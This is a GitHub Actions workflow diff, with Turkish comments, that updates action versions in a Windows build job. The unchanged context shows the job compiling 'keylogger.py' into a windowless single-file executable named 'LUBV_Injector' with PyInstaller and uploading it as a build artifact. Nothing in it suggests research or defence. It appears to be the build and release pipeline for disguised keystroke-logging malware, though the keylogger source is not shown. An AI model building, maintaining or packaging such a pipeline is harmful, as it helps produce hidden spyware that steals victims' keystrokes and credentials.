@@ -10,10 +10,10 @@ jobs:
     runs-on: windows-latest
     
     steps:
-    - uses: actions/checkout@v3
+    - uses: actions/checkout@v4   # v3'ten v4'e güncellendi
     
     - name: Setup Python
-      uses: actions/setup-python@v4
+      uses: actions/setup-python@v5   # v4'ten v5'e güncellendi
       with:
         python-version: '3.10'
     
@@ -26,7 +26,7 @@ jobs:
         pyinstaller --onefile --noconsole --name LUBV_Injector keylogger.py
     
     - name: Upload EXE
-      uses: actions/upload-artifact@v3
+      uses: actions/upload-artifact@v4   # v3'ten v4'e güncellendi BURASI ÖNEMLİ
       with:
         name: LUBV_Injector
         path: dist/LUBV_Injector.exe
